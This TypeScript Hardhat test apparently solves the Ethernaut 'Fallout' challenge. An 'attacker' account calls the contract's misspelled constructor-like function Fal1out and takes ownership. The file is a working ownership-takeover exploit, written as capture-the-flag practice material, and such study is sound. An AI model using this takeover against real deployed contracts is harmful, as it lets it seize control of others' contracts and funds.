import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import web3 from "web3";

import { Fallout } from "../typechain-types/Fallout";

describe("Fallout", function () {
  let attacker: SignerWithAddress;
  let owner: SignerWithAddress;
  let fallout: Fallout;

  before(async function () {
    [owner, attacker] = await ethers.getSigners();

    const FalloutFactory = await ethers.getContractFactory("Fallout");
    fallout = await FalloutFactory.deploy();
  });

  describe("Deployment", function () {
    it("Contract owner was not set", async function () {
      expect(await fallout.owner()).to.equal(
        "0x0000000000000000000000000000000000000000"
      );
    });
  });

  describe("Claim ownership", function () {
    before(async function () {
      await fallout
        .connect(attacker)
        .Fal1out({ value: web3.utils.toWei("0.0005") });
    });

    it("Attacker should claim ownership of the contract", async function () {
      expect(await fallout.owner()).to.equal(attacker.address);
    });
  });
});
